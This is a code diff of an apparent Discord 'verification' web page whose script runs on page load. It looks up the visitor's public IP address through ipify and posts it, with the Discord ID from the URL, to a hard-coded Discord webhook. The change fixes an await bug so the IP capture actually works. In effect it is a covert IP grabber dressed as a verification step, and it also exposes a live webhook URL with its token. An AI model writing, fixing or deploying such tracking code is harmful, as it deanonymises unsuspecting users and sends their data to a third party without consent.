@@ -8,13 +8,16 @@
 <body>
     <script>
         (async () => {
-            const ip = (await fetch("https://api64.ipify.org?format=json")).json();
+            const response = await fetch("https://api64.ipify.org?format=json");
+            const ip = await response.json();
             const discordId = new URLSearchParams(window.location.search).get("id");
-            if (discordId) await fetch("https://discord.com/api/webhooks/1335357251082518700/-zluXm4U386F4xsxtKobIDFLCPHF5YfN4htVGVmepp2ZOf6bAUrpxfl4sxhjQBL95zv6", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ content: `📌 **Neue Verifizierung:**\n🔹 **Discord-ID:** ${discordId}\n🔹 **IP-Adresse:** ${ip.ip}` })
-            });
+            if (discordId) {
+                await fetch("https://discord.com/api/webhooks/1335357251082518700/-zluXm4U386F4xsxtKobIDFLCPHF5YfN4htVGVmepp2ZOf6bAUrpxfl4sxhjQBL95zv6", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ content: `📌 **Neue Verifizierung:**\n🔹 **Discord-ID:** ${discordId}\n🔹 **IP-Adresse:** ${ip.ip}` })
+                });
+            }
         })();
     </script>
 </body>
